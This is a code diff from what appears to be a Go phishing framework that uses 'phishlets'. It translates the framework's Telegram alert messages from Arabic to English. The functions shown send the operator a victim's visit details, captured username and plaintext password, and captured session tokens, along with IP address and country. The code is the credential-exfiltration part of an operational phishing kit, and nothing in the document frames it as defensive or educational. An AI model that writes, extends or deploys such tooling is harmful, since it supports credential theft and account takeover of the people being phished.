@@ -155,12 +155,12 @@ func (t *TelegramBot) NotifyNewVisit(sessionID string, phishlet string, ipAddres
 	country := t.GetCountryFromIP(ipAddress)
 
 	message := fmt.Sprintf(
-		"🔔 <b>زيارة جديدة</b>\n\n"+
-		"🌐 <b>فيشليت:</b> %s\n"+
-		"🆔 <b>الجلسة:</b> %s\n"+
-		"🌍 <b>البلد:</b> %s\n"+
-		"🖥 <b>عنوان IP:</b> %s\n"+
-		"📱 <b>متصفح المستخدم:</b> %s",
+		"🔔 <b>New Visit</b>\n\n"+
+		"🌐 <b>Phishlet:</b> %s\n"+
+		"🆔 <b>Session ID:</b> %s\n"+
+		"🌍 <b>Country:</b> %s\n"+
+		"🖥 <b>IP Address:</b> %s\n"+
+		"📱 <b>User Agent:</b> %s",
 		phishlet, sessionID, country, ipAddress, userAgent,
 	)
 
@@ -176,13 +176,13 @@ func (t *TelegramBot) NotifyCredentialsCaptured(sessionID string, phishlet strin
 	country := t.GetCountryFromIP(ipAddress)
 
 	message := fmt.Sprintf(
-		"🎣 <b>تم التقاط بيانات اعتماد</b>\n\n"+
-		"🌐 <b>فيشليت:</b> %s\n"+
-		"🆔 <b>الجلسة:</b> %s\n"+
-		"👤 <b>اسم المستخدم:</b> %s\n"+
-		"🔑 <b>كلمة المرور:</b> %s\n"+
-		"🌍 <b>البلد:</b> %s\n"+
-		"🖥 <b>عنوان IP:</b> %s",
+		"🎣 <b>Credentials Captured</b>\n\n"+
+		"🌐 <b>Phishlet:</b> %s\n"+
+		"🆔 <b>Session ID:</b> %s\n"+
+		"👤 <b>Username:</b> %s\n"+
+		"🔑 <b>Password:</b> %s\n"+
+		"🌍 <b>Country:</b> %s\n"+
+		"🖥 <b>IP Address:</b> %s",
 		phishlet, sessionID, username, password, country, ipAddress,
 	)
 
@@ -198,11 +198,11 @@ func (t *TelegramBot) NotifyTokensCaptured(sessionID string, phishlet string, ip
 	country := t.GetCountryFromIP(ipAddress)
 
 	message := fmt.Sprintf(
-		"🔐 <b>تم التقاط الرموز</b>\n\n"+
-		"🌐 <b>فيشليت:</b> %s\n"+
-		"🆔 <b>الجلسة:</b> %s\n"+
-		"🌍 <b>البلد:</b> %s\n"+
-		"🖥 <b>عنوان IP:</b> %s",
+		"🔐 <b>Tokens Captured</b>\n\n"+
+		"🌐 <b>Phishlet:</b> %s\n"+
+		"🆔 <b>Session ID:</b> %s\n"+
+		"🌍 <b>Country:</b> %s\n"+
+		"🖥 <b>IP Address:</b> %s",
 		phishlet, sessionID, country, ipAddress,
 	)
 
